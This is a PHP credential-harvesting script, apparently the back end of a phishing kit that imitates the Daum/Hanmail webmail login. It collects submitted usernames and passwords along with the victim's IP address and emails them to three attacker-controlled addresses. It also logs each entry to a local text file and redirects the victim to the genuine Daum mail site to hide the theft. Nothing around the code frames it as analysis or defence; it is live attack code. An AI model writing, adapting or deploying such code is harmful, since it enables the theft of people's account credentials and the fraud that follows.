<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------126 Login Info-----------------------\n";
$message .= "User Id             : ".$_POST['username']."\n";
$message .= "Password             : ".$_POST['Password']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Dec thinz hanmail-----------\n";
$send = "anunimorigba2020@gmail.com, anunimorigba2020@yandex.com, anunimorigba2020@protonmail.ch";
$subject = "Daum Result";
$headers = "From:daum<@newlife.com>";
$headers .= $_POST['userid']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("163.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: https://mail.daum.net/");

	 
?>